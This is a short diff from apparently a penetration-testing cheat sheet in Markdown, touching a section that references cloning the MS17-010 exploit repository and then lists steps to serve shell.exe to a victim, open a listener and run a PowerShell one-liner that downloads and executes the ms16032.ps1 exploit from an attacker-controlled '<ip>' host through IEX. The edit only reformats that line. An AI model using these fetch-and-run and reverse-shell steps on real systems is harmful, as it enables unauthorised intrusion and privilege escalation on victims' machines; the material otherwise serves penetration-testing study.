@@ -107,7 +107,7 @@ git clone https://github.com/worawit/MS17-010.git
   * serve the shell.exe to victim
   * open a listener
   * run the ps1 exploit:
-   * C:\windows\sysnative\windowspowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://\<ip>/ms16032.ps1')
+    ##### C:\windows\sysnative\windowspowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://\<ip>/ms16032.ps1')
   
 ## Privilege Escalation
 ### Windows
